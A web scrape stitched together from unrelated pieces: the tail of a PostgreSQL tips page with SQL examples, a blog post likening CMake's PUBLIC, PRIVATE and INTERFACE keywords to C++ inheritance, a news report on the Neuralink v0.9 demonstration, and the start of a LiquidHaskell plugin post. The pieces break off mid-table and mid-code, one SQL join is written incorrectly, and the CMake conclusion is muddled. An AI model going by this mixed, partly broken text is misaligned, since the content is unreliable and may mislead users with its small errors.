    <span>name</span>  <span>text</span> <span>NOT</span> <span>NULL</span>
<span>);</span>

<span>INSERT</span> <span>INTO</span> <span>items</span> <span>(</span><span>name</span><span>)</span>
     <span>VALUES</span> <span>(</span><span>'wooden axe'</span><span>),</span>
            <span>(</span><span>'loom'</span><span>),</span>
            <span>(</span><span>'eye of ender'</span><span>)</span>
  <span>RETURNING</span> <span>id</span><span>,</span> <span>name</span><span>;</span>
  
<span>-- returns:</span>
<span>--                   id                  |     name</span>
<span>-- --------------------------------------+--------------</span>
<span>--  1cfaae8c-61ff-4e82-a656-99263b7dd0ae | wooden axe</span>
<span>--  be043a89-a51b-4d8b-8378-699847113d46 | loom</span>
<span>--  927d52eb-c175-4a97-a0b2-7b7e81d9bc8e | eye of ender</span></code></pre></figure>

<h3 id="insert-if-not-existing-update-otherwise">Insert If Not Existing, Update Otherwise</h3>

<p>In Postgres 9.5 and later, you can <em>upsert</em> directly using the ON CONFLICT
construct:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>parameters</span> <span>(</span>
    <span>key</span>   <span>TEXT</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
    <span>value</span> <span>TEXT</span>
<span>);</span>

<span>-- when "key" causes a constraint violation, update the "value"</span>
<span>INSERT</span> <span>INTO</span> <span>parameters</span> <span>(</span><span>key</span><span>,</span> <span>value</span><span>)</span> 
     <span>VALUES</span> <span>(</span><span>'port'</span><span>,</span> <span>'5432'</span><span>)</span>
<span>ON</span> <span>CONFLICT</span> <span>(</span><span>key</span><span>)</span> <span>DO</span>
            <span>UPDATE</span> <span>SET</span> <span>value</span><span>=</span><span>EXCLUDED</span><span>.</span><span>value</span><span>;</span></code></pre></figure>

<h3 id="copy-rows-from-one-table-into-another">Copy Rows From One Table Into Another</h3>

<p>The INSERT statement has a form where the values can be supplied by a SELECT
statement. Use this to copy rows from one table into another:</p>

<figure><pre><code data-lang="sql"><span>-- copy between tables with similar columns </span>
  <span>INSERT</span> <span>INTO</span> <span>pending_quests</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> <span>quests</span>
        <span>WHERE</span> <span>progress</span> <span>&lt;</span> <span>100</span><span>;</span>

<span>-- supply some values from another table, some directly</span>
  <span>INSERT</span> <span>INTO</span> <span>archived_quests</span>
       <span>SELECT</span> <span>now</span><span>()</span> <span>AS</span> <span>archival_date</span><span>,</span> <span>*</span>
         <span>FROM</span> <span>quests</span>
        <span>WHERE</span> <span>completed</span><span>;</span></code></pre></figure>

<p>If you’re looking to bulk-load tables, also check out the <a href="https://www.postgresql.org/docs/current/sql-copy.html">COPY command</a>,
which can be used to insert rows from a text or CSV file.</p>

<h3 id="delete-and-return-deleted-information">Delete and Return Deleted Information</h3>

<p>You can use the <code>RETURNING</code> clause to return values from the rows that were
deleted using a bulk-delete statement:</p>

<figure><pre><code data-lang="sql"><span>-- return the list of customers whose licenses were deleted after expiry</span>
<span>DELETE</span> <span>FROM</span> <span>licenses</span>
      <span>WHERE</span> <span>now</span><span>()</span> <span>&gt;</span> <span>expiry_date</span>
  <span>RETURNING</span> <span>customer_name</span><span>;</span></code></pre></figure>

<h3 id="move-rows-from-one-table-into-another">Move Rows From One Table Into Another</h3>

<p>You can move rows from one table to another in a single statement, by using CTEs
with <em>DELETE .. RETURNING</em>:</p>

<figure><pre><code data-lang="sql"><span>-- move yet-to-start todo items from 2020 to 2021</span>
<span>WITH</span> <span>ah_well</span> <span>AS</span> <span>(</span>
    <span>DELETE</span> <span>FROM</span> <span>todos_2020</span>
          <span>WHERE</span> <span>NOT</span> <span>started</span>
      <span>RETURNING</span> <span>*</span>
<span>)</span>
<span>INSERT</span> <span>INTO</span> <span>todos_2021</span>
            <span>SELECT</span> <span>*</span> <span>FROM</span> <span>ah_well</span><span>;</span></code></pre></figure>

<h3 id="update-rows-and-return-updated-values">Update Rows and Return Updated Values</h3>

<p>The RETURNING clause can be used in UPDATEs too. Note that only the new
values of the updated columns can be returned this way.</p>

<figure><pre><code data-lang="sql"><span>-- grant random amounts of coins to eligible players</span>
   <span>UPDATE</span> <span>players</span>
      <span>SET</span> <span>coins</span> <span>=</span> <span>coins</span> <span>+</span> <span>(</span><span>100</span> <span>*</span> <span>random</span><span>())::</span><span>integer</span>
    <span>WHERE</span> <span>eligible</span>
<span>RETURNING</span> <span>id</span><span>,</span> <span>coins</span><span>;</span></code></pre></figure>

<p>If you need the original value of the updated columns: it is possible through a
self-join, but there is no guarantee of atomicity. Try using a <code>SELECT .. FOR
UPDATE</code> instead.</p>

<h3 id="update-a-few-random-rows-and-return-the-updated-ones">Update a Few Random Rows and Return The Updated Ones</h3>

<p>Here’s how you can choose a few random rows from a table, update them and
return the updated ones, all in one go:</p>

<figure><pre><code data-lang="sql"><span>WITH</span> <span>lucky_few</span> <span>AS</span> <span>(</span>
    <span>SELECT</span> <span>id</span>
      <span>FROM</span> <span>players</span>
  <span>ORDER</span> <span>BY</span> <span>random</span><span>()</span>
     <span>LIMIT</span> <span>5</span>
<span>)</span>
   <span>UPDATE</span> <span>players</span>
      <span>SET</span> <span>bonus</span> <span>=</span> <span>bonus</span> <span>+</span> <span>100</span> 
    <span>WHERE</span> <span>id</span> <span>IN</span> <span>(</span><span>SELECT</span> <span>id</span> <span>FROM</span> <span>lucky_few</span><span>)</span>
<span>RETURNING</span> <span>id</span><span>;</span></code></pre></figure>

<h3 id="create-a-table-just-like-another-table">Create a Table Just Like Another Table</h3>

<p>Use the CREATE TABLE .. LIKE construct to create a table with the same columns
as another:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>to_be_audited</span> <span>(</span><span>LIKE</span> <span>purchases</span><span>);</span></code></pre></figure>

<p>By default this does not create similar indexes, constraints, defaults etc. To
do that, ask Postgres explicitly:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>to_be_audited</span> <span>(</span><span>LIKE</span> <span>purchases</span> <span>INCLUDING</span> <span>ALL</span><span>);</span></code></pre></figure>

<p>See the full syntax <a href="https://www.postgresql.org/docs/current/sql-createtable.html">here</a>.</p>

<h3 id="extract-a-random-set-of-rows-into-another-table">Extract a Random Set of Rows Into Another Table</h3>

<p>Since Postgres 9.5, the TABLESAMPLE feature is available to extract a sample of
rows from a table. There are two sampling methods currently, and <em>bernoulli</em> is
usually the one you want:</p>

<figure><pre><code data-lang="sql"><span>-- copy 10% of today's purchases into another table</span>
<span>INSERT</span> <span>INTO</span> <span>to_be_audited</span>
     <span>SELECT</span> <span>*</span>
       <span>FROM</span> <span>purchases</span>
<span>TABLESAMPLE</span> <span>bernoulli</span><span>(</span><span>10</span><span>)</span>
      <span>WHERE</span> <span>transaction_date</span> <span>=</span> <span>CURRENT_DATE</span><span>;</span></code></pre></figure>

<p>The <em>system</em> tablesampling method is faster, but does not return a uniform
distribution. See the <a href="https://www.postgresql.org/docs/current/sql-select.html#SQL-FROM">docs</a>
for more info.</p>

<h3 id="create-a-table-from-a-select-query">Create a Table From a Select Query</h3>

<p>You can use the CREATE TABLE .. AS construct to create the table and populate
it from a SELECT query, all in one go:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>to_be_audited</span> <span>AS</span>
      <span>SELECT</span> <span>*</span>
        <span>FROM</span> <span>purchases</span>
 <span>TABLESAMPLE</span> <span>bernoulli</span><span>(</span><span>10</span><span>)</span>
       <span>WHERE</span> <span>transaction_date</span> <span>=</span> <span>CURRENT_DATE</span><span>;</span></code></pre></figure>

<p>The resultant table is like a materialized view without a query associated with
it. Read more about <a href="https://www.postgresql.org/docs/current/sql-createtable.html">CREATE TABLE .. AS here</a>.</p>

<h3 id="create-unlogged-tables">Create Unlogged Tables</h3>

<p><em>Unlogged</em> tables are not backed by WAL records. This means that updates and
deletes to such tables are faster, but they are not crash-tolerant and cannot
be replicated.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>UNLOGGED</span> <span>TABLE</span> <span>report_20200817</span> <span>(</span><span>LIKE</span> <span>report_v3</span><span>);</span></code></pre></figure>

<h3 id="create-temporary-tables">Create Temporary Tables</h3>

<p><em>Temporary</em> tables are implicitly unlogged tables, with a shorter lifetime. They
automatically self-destruct at the end of a session (default), or at the end
of the transaction.</p>

<p>Data within temporary tables cannot be shared across sessions. Multiple sessions
can create temporary tables with the same name.</p>

<figure><pre><code data-lang="sql"><span>-- temp table for duration of the session</span>
<span>CREATE</span> <span>TEMPORARY</span> <span>TABLE</span> <span>scratch_20200817_run_12</span> <span>(</span><span>LIKE</span> <span>report_v3</span><span>);</span>

<span>-- temp table that will self-destruct after current transaction</span>
<span>CREATE</span> <span>TEMPORARY</span> <span>TABLE</span> <span>scratch_20200817_run_12</span>
                      <span>(</span><span>LIKE</span> <span>report_v3</span><span>)</span>
                      <span>ON</span> <span>COMMIT</span> <span>DROP</span><span>;</span>

<span>-- temp table that will TRUNCATE itself after current transaction</span>
<span>CREATE</span> <span>TEMPORARY</span> <span>TABLE</span> <span>scratch_20200817_run_12</span>
                       <span>(</span><span>LIKE</span> <span>report_v3</span><span>)</span>
                       <span>ON</span> <span>COMMIT</span> <span>DELETE</span> <span>ROWS</span><span>;</span></code></pre></figure>



<p>Comments can be added to any object in the database. Many tools, including
pg_dump, understand these. A useful comment might just avoid a ton of trouble
during cleanup!</p>

<figure><pre><code data-lang="sql"><span>COMMENT</span> <span>ON</span> <span>INDEX</span> <span>idx_report_last_updated</span>
        <span>IS</span> <span>'needed for the nightly report app running in dc-03'</span><span>;</span>

<span>COMMENT</span> <span>ON</span> <span>TRIGGER</span> <span>tgr_fix_column_foo</span>
        <span>IS</span> <span>'mitigates the effect of bug #4857'</span><span>;</span></code></pre></figure>

<h3 id="advisory-locks">Advisory Locks</h3>

<p>Advisory locks can be used to co-ordinate actions between two apps connected to
the <em>same</em> database. You can use this feature to implement a global, distributed
mutex for a certain operation, for example. Read all about it <a href="https://www.postgresql.org/docs/current/explicit-locking.html#ADVISORY-LOCKS">here in the
docs</a>.</p>

<figure><pre><code data-lang="sql"><span>-- client 1: acquire a lock </span>
<span>SELECT</span> <span>pg_advisory_lock</span><span>(</span><span>130</span><span>);</span>
<span>-- ... do work ...</span>
<span>SELECT</span> <span>pg_advisory_unlock</span><span>(</span><span>130</span><span>);</span>

<span>-- client 2: tries to do the same thing, but mutually exclusive</span>
<span>-- with client 1</span>
<span>SELECT</span> <span>pg_advisory_lock</span><span>(</span><span>130</span><span>);</span> <span>-- blocks if anyone else has held lock with id 130</span>

<span>-- can also do it without blocking:</span>
<span>SELECT</span> <span>pg_try_advisory_lock</span><span>(</span><span>130</span><span>);</span>
<span>-- returns false if lock is being held by another client</span>
<span>-- otherwise acquires the lock then returns true</span></code></pre></figure>

<h3 id="aggregate-into-arrays-json-arrays-or-strings">Aggregate Into Arrays, JSON Arrays or Strings</h3>

<p>Postgres provides aggregate functions that concatenate values in a <em>GROUP</em> to
yield arrays, JSON arrays or strings:</p>

<figure><pre><code data-lang="sql"><span>-- get names of each guild, with an array of ids of players that</span>
<span>-- belong to that guild</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span> <span>AS</span> <span>guild_name</span><span>,</span> <span>array_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>)</span> <span>AS</span> <span>players</span>
    <span>FROM</span> <span>guilds</span>
    <span>JOIN</span> <span>players</span> <span>ON</span> <span>players</span><span>.</span><span>guild_id</span> <span>=</span> <span>guilds</span><span>.</span><span>id</span>
<span>GROUP</span> <span>BY</span> <span>guilds</span><span>.</span><span>id</span><span>;</span>

<span>-- same but the player list is a CSV string</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span><span>,</span> <span>string_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>,</span> <span>','</span><span>)</span> <span>-- ...</span>
  
<span>-- same but the player list is a JSONB array</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span><span>,</span> <span>jsonb_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>)</span> <span>-- ...</span>
  
<span>-- same but returns a nice JSONB object like so:</span>
<span>-- { guild1: [ playerid1, playerid2, .. ], .. }</span>
<span>SELECT</span> <span>jsonb_object_agg</span><span>(</span><span>guild_name</span><span>,</span> <span>players</span><span>)</span> <span>FROM</span> <span>(</span>
  <span>SELECT</span> <span>guilds</span><span>.</span><span>name</span> <span>AS</span> <span>guild_name</span><span>,</span> <span>array_agg</span><span>(</span><span>players</span><span>.</span><span>id</span><span>)</span> <span>AS</span> <span>players</span>
    <span>FROM</span> <span>guilds</span>
    <span>JOIN</span> <span>players</span> <span>ON</span> <span>players</span><span>.</span><span>guild_id</span> <span>=</span> <span>guilds</span><span>.</span><span>id</span>
<span>GROUP</span> <span>BY</span> <span>guilds</span><span>.</span><span>id</span>
<span>)</span> <span>AS</span> <span>q</span><span>;</span></code></pre></figure>

<h3 id="aggregates-with-order">Aggregates With Order</h3>

<p>While we’re on the topic, here’s how to set the order of values that are passed
to the aggregate function, <em>within each group</em>:</p>

<figure><pre><code data-lang="sql"><span>-- each state with a list of counties sorted alphabetically</span>
  <span>SELECT</span> <span>states</span><span>.</span><span>name</span><span>,</span> <span>string_agg</span><span>(</span><span>counties</span><span>.</span><span>name</span><span>,</span> <span>','</span> <span>ORDER</span> <span>BY</span> <span>counties</span><span>.</span><span>name</span><span>)</span>
    <span>FROM</span> <span>states</span> <span>JOIN</span> <span>counties</span>
    <span>JOIN</span> <span>states</span><span>.</span><span>name</span> <span>=</span> <span>counties</span><span>.</span><span>state_name</span>
<span>GROUP</span> <span>BY</span> <span>states</span><span>.</span><span>name</span><span>;</span></code></pre></figure>

<p>Yes, there is a trailing ORDER BY clause inside the function call paranthesis.
Yes, the syntax is weird.</p>

<h3 id="array-and-unnest">Array and Unnest</h3>

<p>Use the ARRAY constructor to convert a set of rows, each with one column, into
an array.  The database driver (like JDBC) should be able to map Postgres arrays
into native arrays and might be easier to work with.</p>

<figure><pre><code data-lang="sql"><span>-- convert rows (with 1 column each) into a 1-dimensional array</span>
<span>SELECT</span> <span>ARRAY</span><span>(</span><span>SELECT</span> <span>id</span> <span>FROM</span> <span>players</span> <span>WHERE</span> <span>lifetime_spen…</span></code></pre></figure></div></div></div></div>

      <h3 id="introduction">Introduction</h3>

<p>CMake is one of the most convenient building tools for C/C++ projects. When it comes to <a href="https://cmake.org/cmake/help/latest/command/target_include_directories.html"><code>target_include_directories</code></a> and <a href="https://cmake.org/cmake/help/latest/command/target_link_libraries.html"><code>target_link_libraries</code></a>, there are several keywords, <code>PUBLIC</code>, <code>PRIVATE</code>, and <code>INTERFACE</code>, that I got confused about from time to time even if I have read the related official documentations. So When I was building my C/C++ projects using CMake, I often just use <code>PUBLIC</code> everywhere or leave the keyword blank (CMake will then use <code>PUBLIC</code> by default), the libraries and executables built from the projects would work in most of the scenarios. However, it is certainly not best practice.</p>



<p>Today, I read Kuba Sejdak’s blog post <a href="https://kubasejdak.com/modern-cmake-is-like-inheritance">“Modern CMake is Like Inheritance”</a> and I found his interpretation on the CMake keywords <code>PUBLIC</code>, <code>PRIVATE</code>, and <code>INTERFACE</code> inspiring. So in this blog post, I would like to discuss some of my thoughts on these CMake keywords from the perspective of “inheritance”.</p>

<h3 id="c-inheritance">C++ Inheritance</h3>

<h4 id="access-specifiers">Access Specifiers</h4>

<p>In C++ object oriented programming, there are three types of access specifiers for classes.</p>



<table>
<thead>
  <tr>
    <th>Access Specifier</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>Members are accessible from outside the class.</td>
  </tr>
  <tr>
    <td>protected</td>
    <td>Members cannot be accessed from outside the class. However, they can be accessed in inherited classes.</td>
  </tr>
  <tr>
    <td>private</td>
    <td>Members cannot be accessed (or viewed) from outside the class.</td>
  </tr>
</tbody>
</table>

<p>Alternatively, this could be described using the following simplified table.</p>



<table>
<thead>
  <tr>
    <th>Access Specifier</th>
    <th>Same Class</th>
    <th>Derived Class</th>
    <th>Outside Class</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>Yes</td>
    <td>Yes</td>
    <td>Yes</td>
  </tr>
  <tr>
    <td>protected</td>
    <td>Yes</td>
    <td>Yes</td>
    <td>No</td>
  </tr>
  <tr>
    <td><span>private</span></td>
    <td>Yes</td>
    <td>No</td>
    <td>No</td>
  </tr>
</tbody>
</table>

<h4 id="inheritance-types">Inheritance Types</h4>

<p>When it comes to class inheritance, there are also three types of inheritances.</p>



<table>
<thead>
  <tr>
    <th>Inheritance Type</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>Public members of the base class become public members of the derived class and protected members of the base class become protected members of the derived class. A base class's private members are never accessible directly from a derived class, but can be accessed through calls to the public and protected members of the base class.</td>
  </tr>
  <tr>
    <td><span>protected</span></td>
    <td>Public and protected members of the base class become protected members of the derived class.</td>
  </tr>
  <tr>
    <td>private</td>
    <td>Public and protected members of the base class become private members of the derived class.<br></td>
  </tr>
</tbody>
</table>

<p>Alternatively, this could be described using the following simplified table.</p>



<table>
<thead>
  <tr>
    <th>Inheritance Type</th>
    <th>base: public member</th>
    <th><span>base: </span>protected <span>member</span></th>
    <th><span>base: </span>private <span>member</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>derived: public member</td>
    <td><span>derived: </span>protected member</td>
    <td>-</td>
  </tr>
  <tr>
    <td>protected</td>
    <td><span>derived: </span>protected <span>member</span></td>
    <td><span>derived:</span> protected <span>member</span></td>
    <td>-</td>
  </tr>
  <tr>
    <td>private</td>
    <td><span>derived:</span> private <span>member</span></td>

<h3 id="cmake-inheritance">CMake Inheritance</h3>

<p>CMake uses somewhat similar inheritance concepts to C++, especially for the C++ <code>public</code> and <code>private</code> access specifiers and inheritance types. The CMake keywords <code>PUBLIC</code>, <code>PRIVATE</code>, and <code>INTERFACE</code> used in <code>target_include_directories</code> and <code>target_link_libraries</code>, in my opinion, are mixtures of access specifier and inheritance type from C++.</p>

<h4 id="include-inheritance">Include Inheritance</h4>

<p>In CMake, for any <code>target</code>, in the preprocessing stage, it comes with a <code>INCLUDE_DIRECTORIES</code> and a <code>INTERFACE_INCLUDE_DIRECTORIES</code> for searching the header files building. <code>target_include_directories</code> will populate all the directories to <code>INCLUDE_DIRECTORIES</code> and/or <code>INTERFACE_INCLUDE_DIRECTORIES</code> depending on the keyword <code>&lt;PRIVATE|PUBLIC|INTERFACE&gt;</code> we specified. The <code>INCLUDE_DIRECTORIES</code> will be used for the current <code>target</code> only and the <code>INTERFACE_INCLUDE_DIRECTORIES</code> will be appended to the <code>INCLUDE_DIRECTORIES</code> of any other <code>target</code> which has dependencies on the current <code>target</code>. With such settings, the configurations of <code>INCLUDE_DIRECTORIES</code> and <code>INTERFACE_INCLUDE_DIRECTORIES</code> for all building targets are easy to compute and scale up even for multiple hierarchical layers of building dependencies and many building targets.</p>



<table>
<thead>
  <tr>
    <th>Include Inheritance</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>PUBLIC</td>
    <td>All the directories following PUBLIC will be used for the current target and <span>the other targets that have dependencies on the current target, i.e., appending the directories to </span>INCLUDE_DIRECTORIES and INTERFACE_INCLUDE_DIRECTORIES.</td>
  </tr>
  <tr>
    <td>PRIVATE</td>
    <td><span>All the include directories following PRIVATE will be used for the current target only</span>, i.e., appending the directories to <span>INCLUDE_DIRECTORIES.</span></td>
  </tr>
  <tr>
    <td>INTERFACE</td>
    <td><span>All the include directories following INTERFACE</span> will NOT be used for the current target but will be accessible for the other targets that have dependencies on the current target<span>, i.e., appending the directories to </span>INTERFACE_INCLUDE_DIRECTORIES.</td>
  </tr>
</tbody>
</table>

<p>Note that when we do <code>target_link_libraries(&lt;target&gt; &lt;PRIVATE|PUBLIC|INTERFACE&gt; &lt;item&gt;)</code>, the dependent <code>&lt;item&gt;</code>, if built in the same CMake project, would append the <code>INTERFACE_INCLUDE_DIRECTORIES</code> of <code>&lt;item&gt;</code> to the <code>INCLUDE_DIRECTORIES</code> of <code>&lt;target&gt;</code>. By controlling the <code>INTERFACE_INCLUDE_DIRECTORIES</code>, we could eliminate some unwanted or conflicting declarations from <code>&lt;item&gt;</code> to the <code>&lt;target&gt;</code>.</p>



<p>For example, the <code>fruit</code> library has <code>INCLUDE_DIRECTORIES</code> of <code>fruit_h</code>, <code>tree_h</code>, and <code>INTERFACE_INCLUDE_DIRECTORIES</code> of <code>fruit_h</code>. If there is a <code>apple</code> library that is linked with the <code>fruit</code> library, the <code>apple</code> library would also have the <code>fruit_h</code> in its <code>INCLUDE_DIRECTORIES</code> as well. We could equivalently say, the <code>apple</code> library’s include directory inherited the <code>fruit_h</code> of the  <code>fruit</code> library.</p>

<h4 id="link-inheritance">Link Inheritance</h4>

<p>Similarly, for any <code>target</code>, in the linking stage, we would need to decide, given the <code>item</code> to be linked, whether we have to put the <code>item</code> in the link dependencies, or the link interface, or both, in the compiled <code>target</code>. Here the link dependencies means the <code>item</code> has some implementations that the <code>target</code> would use, and it is linked to the <code>item</code>, so that whenever we call the functions or methods corresponding to those implementations it will always be mapped correctly to the implementations in <code>item</code> via the link, whereas the link interface means the <code>target</code> becomes an interface for linking the <code>item</code> for other targets which have dependencies on the <code>target</code>, and the <code>target</code> does not have to use <code>item</code> at all.</p>



<table>
<thead>
  <tr>
    <th>Link Type</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>PUBLIC</td>
    <td>All the objects following PUBLIC will be used for linking to the current target and providing the interface to the other targets that have dependencies on the current target.</td>
  </tr>
  <tr>
    <td>PRIVATE</td>
    <td><span>All the objects following </span>PRIVATE will only be used for linking to the current target.</td>
  </tr>
  <tr>
    <td>INTERFACE</td>
    <td><span>All the objects following </span>INTERFACE will only be used for providing the interface to the other targets that have dependencies on the current target.</td>
  </tr>
</tbody>
</table>

<p>For example, if the <code>fruit</code> library has the implementation of functions, such as <code>size</code> and <code>color</code>, and the <code>apple</code> library has a function <code>apple_size</code> which called the <code>size</code> from the <code>fruit</code> library and was <code>PRIVATE</code> linked with the <code>fruit</code> library. We could create an executable <code>eat_apple</code> that calls <code>apple_size</code> by <code>PUBLIC</code> or <code>PRIVATE</code> linking with the <code>apple</code> library. However, if we want to create an executable <code>eat_apple</code> that calls the <code>size</code> and <code>color</code> from the <code>fruit</code> library, only linking with the <code>apple</code> library will cause building error, since the <code>fruit</code> library was not part of the interface in the <code>apple</code> library, and is thus inaccessible to <code>eat_apple</code>. To make the <code>apple</code> library to inherit the <code>size</code> and <code>color</code> from the <code>fruit</code> library, we have to make the linking of the <code>apple</code> library to the the <code>fruit</code> library <code>PUBLIC</code> instead of <code>PRIVATE</code>.</p>

<h3 id="conclusions">Conclusions</h3>

<p>The CMake builds a hierarchical project via the include interface or link interface. The “inheritance” mechanism in C++ is built upon the include interface or link interface.</p>

<h3 id="faq">FAQ</h3>

<h4 id="how-to-understand-cmake-interface">How to Understand CMake Interface?</h4>

<p>In my understanding, CMake interface is just like a telephone switch station in old times.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-08-08-CMake-Public-Private-Interface/medienwandel-chicago-union-station-telegraph-switchboard.jpg">
    <figcaption>Telephone Switch Station</figcaption>
</figure>
</div>

<p>If <code>A</code> wants to call <code>B</code> and there is no direct telephone cable connection between <code>A</code> and <code>B</code>, <code>A</code> has to call a telephone switch station that has connection to <code>B</code> and the personal in the telephone switch station will connect <code>A</code> and <code>B</code> by jointing the cable of <code>A</code> and the cable of <code>B</code> together. If the telephone switch station does not know there is a <code>B</code>, it is impossible to get <code>A</code> and <code>B</code> connected. So CMake interface is simply a registration in the telephone switch station. When there is a dependency in CMake targets, targets from different levels of hierarchy are connected via interfaces, for both <code>include</code> and <code>link</code>.</p>

<h4 id="what-are-the-key-points-for-this-blog-post">What are the Key Points for This Blog Post?</h4>

<p><code>PRIVATE</code> only cares about himself and does not allow inheritance. <code>INTERFACE</code> only cares about others and allows inheritance. <code>PUBLIC</code> cares about everyone and allows inheritance.</p>

<h4 id="is-public-private-interface-part-of-the-gccg-compiler">Is PUBLIC, PRIVATE, INTERFACE Part of the GCC/G++ Compiler?</h4>

<p>No. Compilers, such as <code>gcc</code> and <code>g++</code>, do not have such mechanism. CMake invented those keywords for user to create a building graph that has very clear and explicit dependencies. The building graph translates to normal building commands using <code>gcc</code> and <code>g++</code>.</p>

                    <p><strong>Neuralink Live Demonstration Shows the Potential and Infancy of the Link Device</strong></p><p>From the Neuralink headquarters, Elon Musk and the team at Neuralink demonstrated a working version of their "version 0.9" Link device in a presentation that showed off the current hardware, the surgical implant process, and the data it can currently collect. According to Musk, the presentation was designed primarily to promote recruitment at Neuralink, looking to convince good people to work at Neuralink. </p><p>Musk's stated goal for Neuralink is to solve important brain and spine problems. By creating a generalized brain device that is reliable and affordable, the plan is to be able to treat any neurological problem that someone might have during their life, from hearing loss to memory loss to depression and anxiety. Because senses consist of electrical signals sent by neurons to your brain, if the Neuralink can correct those signals, it can can potentially solve any brain problem. </p><p><strong>What is the device?</strong></p><p>The v0.9 "Link" device demonstrated is a coin-sized computing device which is designed to be implanted into the wearer's head - replacing a piece of the skull. The Link is equipped with sensors found in most of today's cell phones and wearable devices such as inertial measurement, temperature and pressure sensors. It's equipped with a battery designed to last a full day that can be charged wirelessly (through induction) to allow easy recharging at night while the wearer is asleep. </p><p>Attached to the circular part of the devices are many electrodes called threads that can both send signals to neurons in the brain and read the electrical signals sent by the neurons. Each thread is 1/20th the diameter of a single strand of hair. As Musk described it, "In a lot of ways, it's kind of like a Fitbit in your skull with tiny wires."</p><figure><img src="https://www.brainhackernews.com/content/images/2020/08/v0.9.png" alt="" srcset="https://www.brainhackernews.com/content/images/size/w600/2020/08/v0.9.png 600w, https://www.brainhackernews.com/content/images/size/w1000/2020/08/v0.9.png 1000w, https://www.brainhackernews.com/content/images/size/w1600/2020/08/v0.9.png 1600w, https://www.brainhackernews.com/content/images/2020/08/v0.9.png 2076w" sizes="(min-width: 720px) 720px"></figure><p><strong>How is it installed?</strong></p><p>By a surgical robot, of course. The robot was also on display, and has been used to implant the Link device in pigs. Eventually the the robot will be used for the entire surgical process once it is approved for human use. That process consists of first removing the skull fragment, then installing the electrodes into the brain. The robot is used because of the precision required to install the threads into the correct location. When installed with that level of precision, no bleeding in the brain occurs because all blood vessels are avoided. This is made possible by imaging taken of the brain, which the robot uses to guide its installation of the threads. </p><p>Currently the threads can only be attached to the cortical surface (outer layer of the brain), but there are plans to be able to implant the threads at arbitrary depths. Once the threads are placed, the device is implanted and the wound is super glued shut. &nbsp;The surgery itself is not long. Musk said that patients will be able to leave the hospital the same day, and if the device is implanted underneath the patient's hair, it will not be visible. </p><p>The device was approved as a breakthrough technology by the FDA in July, and according to Musk, the device will significantly exceed the FDA's safety standards. Human trials are pending FDA approvals and further safety testing. </p><p><strong>What does the device do?</strong></p><p>By reading and writing electrical signals into the brain, the Link is able to detect the spike of electrical activity created by neurons as well as induce them to fire. These neuronal spikes are the primary method of communication for neurons in the brain, so by reading them and creating them, the Link can decipher what the brain is doing, and make it do things through stimulation. </p><p>In his "Three Little Pigs" demo, Musk showed one pig without the device implanted, a second with the device implanted, and a third which had the device implanted then removed (to demonstrate that it's safe to remove permanently or upgrade). There was no discernible difference between the pigs, except for data that was being transmitted by the pig with the Link implanted. The neuronal spikes were displayed on a graph in real-time as the pig walked around its pen and were translated into beeps that would grow louder and faster as the pig interacted with the environment with its snout. </p><p>A recorded demo showed that when the Link was used to capture electrical activity from a pig walking on a treadmill, it was possible to decipher the pigs movements with a high level of accuracy. </p><p><strong>Where is the technology headed?</strong></p><p>The initial treatment targets of the team are restoring movement and communication in spinal cord injury patients. According to Musk, the first version of the device installed only in the outer layer of the cortical surface, should be able to to solve blindness, hearing loss and paralysis. </p><p>It will eventually be possible to connect the device to an app on the wearer's smartphone and interface with the device for monitoring health data and sending signals, even possibly playing music directly into your brain. During the Q&amp;A portion of the event, the topic of gaming came up, and the team stated their functional target was to allow a quadriplegic to play StarCraft. &nbsp;When asked if the Link could be used to summon a Tesla with a thought, Musk answered yes unequivocally, but there's no telling when that will actually be possible. </p><p>The first version of the device will be expensive, but Musk hopes to reduce the cost to several thousand dollars inclusive of surgery to be as affordable as LASIK surgery. </p><p>You can watch the <a href="https://www.youtube.com/watch?v=DVvmgjBL74w">official live stream</a> of the event to learn more.</p>

          <p><strong>TL;DR</strong> Starting from version <em>0.8.10.1</em>, LiquidHaskell is available as a GHC Plugin. Paying special attention to support existing IDE tooling led to some non-conventional design choices.</p>
<p><a href="https://ucsd-progsys.github.io/liquidhaskell-blog">LiquidHaskell</a> is a <em>refinement type checker</em> for Haskell that empowers programmers to express contracts about their programs which are checked at compile time, and it has been a wonderful tool for the community in addition to GHC, when the latter is not enough. LiquidHaskell has been historically available only as a standalone executable which accepted one Haskell file at a time, making the process of integrating it into an existing code base more tricky than it should have been.</p>
<p>In this blog post we’ll explore how we turned LiquidHaskell into a GHC Plugin, and all the challenges we had to overcome along the way.</p>
<!-- more -->
<h3 id="introduction">Introduction</h3>
